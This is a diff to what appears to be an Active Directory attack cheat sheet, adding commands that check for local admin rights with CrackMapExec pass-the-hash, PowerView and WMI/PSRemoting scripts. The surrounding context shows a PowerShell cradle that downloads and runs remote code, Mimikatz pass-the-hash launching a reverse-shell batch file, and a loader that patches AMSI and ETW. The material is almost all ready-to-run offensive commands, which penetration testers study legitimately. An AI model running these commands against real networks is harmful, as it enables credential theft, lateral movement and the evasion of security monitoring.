@@ -152,6 +152,28 @@ $Contents = 'powershell.exe -c iex ((New-Object Net.WebClient).DownloadString(''
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:C:\reverse.bat"'
 ```
 
+## Check Local Admin Access
+#### Crackmapexec
+```
+cme smb <COMPUTERLIST> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+```
+
+#### Powerview
+```
+Find-LocalAdminAccess -Verbose
+```
+
+### Other scripts
+```
+. ./Find-WMILocalAdminAccess.ps1
+Find-WMILocalAdminAccess
+```
+
+```
+. ./Find-PSRemotingLocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess
+```
+
 ## Offensive .NET
 - https://github.com/Flangvik/NetLoader
 - Load binary from filepath or URL and patch AMSI & ETW while executing
